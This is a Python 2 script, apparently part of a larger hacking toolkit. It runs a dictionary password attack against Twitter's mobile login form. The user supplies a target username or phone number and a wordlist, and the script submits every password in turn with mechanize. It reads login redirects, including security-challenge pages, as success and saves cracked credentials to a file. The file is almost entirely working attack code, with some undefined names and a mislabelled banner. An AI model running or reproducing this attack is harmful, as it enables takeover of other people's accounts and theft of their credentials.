#!/usr/bin/env python
def twitter():
    ulis = '//mobile.twitter.com/home'
    attempt = 0
    site = 'Twitter'
    print ""+P+" "
    e = os.system(d)
    e
    dil = '''
    {}<><><><><><><><><><><><><><><><><><><><><>{}
    { Instagram-Cracker 6.7| Created by Andrew-El}
    {}<><><><><><><><><><><><><><><><><><><><><>{}
    '''
    url = 'https://m.twitter.com/login/'
    dil
    print '''
    Username or phone number/email?
    p = Phone, u = username
    '''
    pu = raw_input("option:").lower()
    if pu == 'u':
        username = raw_input('Username:')
        ulio = requests.get('https://www.mobile.twitter.com/' + username)
        if ulio.status_code == 200:
                os.system(d)
                print "Username Exists!"
        else:
                print("That doesn't Exist!")
                sleep(3)
                os.system(d)
                instagram()
    elif pu == 'p':
        username = raw_input(color.BLUE + 'Phone_Number/Email:')
    else:
        print 'not an option'
        sleep(3)
        e
        instagram()	
            
    wordliste = raw_input(color.YELLOW + 'PATH to wordlist:' + color.GREEN)
    try:
        wordlister = open(wordliste, 'r')
    except:
        print "list isn't found"
        sleep(3)
        os.system(d)
        facebook()
    print("Default is 4")
    timmir = int(raw_input(color.YELLOW + "delay time between guesses:" + color.GREEN) or 4)
    os.system(d)
    print 'Do you want to save the output to a file?'
    deltaco = raw_input(':')
    os.system(d)
    fil = raw_input(color.YELLOW + 'PATH to output file:' + color.GREEN)
    try:
        fil = open(fil, 'a')
    except:
        os.system(d)
        print "That doesn't exist"
    deltaco = deltaco.lower()
    wordlist = list(wordlister)
    rec = wordlist.remove('\n')
    rec
    for password in wordlist:
            try:
                attempt=attempt+1
                password = password.strip()
                t = mechanize.Browser()
                t.set_handle_equiv(True)
                t.set_handle_referer(True)
                t.set_handle_robots(False)
                t.addheaders = [('User-Agent', useragent)]
                response = t.open(url)
                t.form = list(t.forms())[0]
                t.form['session[username_or_email]'] = username
                t.form['session[password]'] = password
                t.method = 'POST'
                response = t.submit()
                if response.geturl() == 'https://www.twitter.com/':
                    os.system(d)
                    print ""+P+" "
                    print
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + ' Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                    fil.write('\n' + site + '|'+ 'Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                    print "File Saved!"
                    menuit()
                    if deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                                    
                elif response.geturl() == 'https://www.twitter.com/mobileprotection?source=mobile_mirror_nux':
                    os.system(d)
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + '|' + ' Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + ' Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                elif response.geturl() == ulis:
                    os.system(d)
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------')
                    print("Challenge Required/ or layman's terms| they have a notification of password incursion")
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                                
                elif response.geturl() == 'https://www.twitter.com/?sk=welcome':
                    os.system(d)
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------')
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                
                elif response.geturl() == 'https://www.twitter.com/challenge/2337953697/jtXc04VfD9/':
                    os.system(d)
                    print ""+P+" "
                    print'[-]============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]============================[-]'
                    print'[-]++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------')
                    print("Challenge Required/ or layman's terms| they have a notification of password incursion")
                    print('Password Found!')
                    print(color.GREEN + site + '|' + 'Username:' + username + ' Password' + password + color.BLUE)
                    if deltaco == 'yes':
                        attempt = str(attempt)
                        fil.write('\n' + site + '|' + ' Username/Phone:' + username + ' Password:' + password + '  Attempt:' + attempt)
                        print "File Saved!"
                        menuit()
                    elif deltaco == 'no':
                        pass
                    else:
                        print "nope, that doesn't work"
                        quit()
                else:
                    os.system(d)
                    print ""+P+" "
                    print'[-]==============================[-]'
                    print'[-]Twitter-Cracker|V2.0|Andrew [-]'
                    print'[-]==============================[-]'
                    print response.geturl()
                    print'[-]++++++++++++++++++++++++++++++[-]'
                    print('{Username:%s' % username)
                    print('{Wordlist:%s' % wordliste)
                    print('{password:%s' % password)
                    print('{Attempt:%s' % attempt)
                    print('------------------------------------')
                    print('Password:%s Does not work!' % password)
                    sleep(timmir)
                    os.system(d)
                        
            except KeyboardInterrupt:kill()

